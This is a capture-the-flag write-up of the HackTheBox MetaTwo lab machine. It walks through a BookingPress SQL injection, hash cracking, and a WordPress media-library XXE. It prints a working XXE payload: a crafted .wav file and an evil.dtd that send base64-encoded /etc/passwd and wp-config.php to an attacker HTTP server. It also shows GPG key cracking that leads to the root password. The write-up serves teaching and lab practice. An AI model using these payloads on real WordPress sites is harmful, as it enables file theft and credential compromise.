---
title: "HackTheBox - MetaTwo"
author: Nasrallah
description: ""
date: 2023-02-25 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, wordpress, cve, john, crack, metasploit, slqi, xxe, gpg]
img_path: /assets/img/hackthebox/machines/metatwo
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [MetaTwo](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.


```terminal
Nmap scan report for 10.10.11.186                                                                                                                             
Host is up (0.26s latency).                                                                                                                                   
Not shown: 988 closed tcp ports (reset)                                                                                                                       
PORT      STATE    SERVICE       VERSION                                                                                                                      
21/tcp    open     ftp                                                                                                                                        
| fingerprint-strings:                                                                                                                                        
|   GenericLines: 
|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp    open     ssh           OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4b44617d2102d8fec1dc927fecd79ee (RSA)
|   256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA)
|_  256 fd78c0b0e22016fa050debd83f12a4ab (ED25519)
80/tcp    open     http          nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/

```

We found 3 open ports, 21 running an ftp server, 22 is OpenSSH and 80 is http nginx web server.

## Web

From the nmap scan, we see we get redirected to the host metapress.htb, let's add it to `/etc/hosts` and check the web page.

![](1.png)

This is a wordpress website, we can use `wpscan` to look for plugins.

Checking the `/events/` page, we see that it uses a plugin called `bookingpress`.

![](2.png)

Searching on google for this plugin, we find it's vulnerable to an unauthenticated SQL injection(CVE-2022-0739).

We can find the exploit on metasploit `auxiliary/gather/wp_bookingpress_category_services_sqli`.

Let's use the exploit, set the required options and run it.

![](3.png)

We managed to get two password hashes, let's try cracking them.

![](4.png)

We got the manager's password, let's login.

![](5.png)

# **Foothold**

We a little to work with in this manager account, the one thing we have is `media library` where we can upload file to the server.

Checking `wappalyzer`, we see that the version of wordpress is 5.6.2.

Searching on google for `wordpress 5.6.2 media library exploit`, we find XXE vulnerability in media library [CVE-2021-29447](https://blog.wpsec.com/wordpress-xxe-in-media-library-cve-2021-29447/).

We can follow the steps described [here](https://www.exploit-db.com/exploits/50304) to read local files.

First, we create a .wav audio file using this command:

```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.10.10:8000/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

Next we create an `evil.dtd` file where we specify what file we want to read.

```bash
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.10.10:8000/?p=%file;'>" >
```

Now we start an http server in the same directory as the evil.dtd file.

```bash
php -S 0.0.0.0:8000
```

Now we upload the payload.wav file.

![](6.png)

Great! We got back `/etc/passwd` file, let's decode it.

![](7.png)

Nice, now let's read the wp-config.php file since it's the file that contains passwords in wordpress.

![](8.png)

Let's decode it.

![](9.png)

We got FTP credentials, let's authenticate to the ftp server we found earlier.

![](10.png)

We found a php file and downloaded it, let's check it out.

![](11.png)

We found jnelson's password, let's ssh to the target machine.

# **Privilege Escalation**

Checking jnelson's home directory, we found a hidden directory called `.passpie`.

![](12.png)

Searching on google we find that [passpie](https://github.com/marcwebbie/passpie) is a command line password manager.

![](13.png)

On the `~/.passpie/ssh` directory, we find two files `jnelson.pass and root.pass`. According to the description of `passpie`, those are password files that are encrypted using gpg.

On the passpie directory, we find a hidden file called keys that has a public/private pgp key.

![](14.png)

I copied the file to my machine with the command `scp jnelson@metapress.htb:./.passpie/.keys ./`.

Next we copy the private key to a separate file using this command `tail -n 45 keys > key.priv`.

Then we extract the password hash with `gpg2john` and then crack it.

![](15.png)

We got the password, now we can go back to our ssh session and run `passpie export` to get the clear text password.

![](16.png)


![](17.png)

We got the root password, we can either switch to it with `su root` or ssh to the machine as root.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).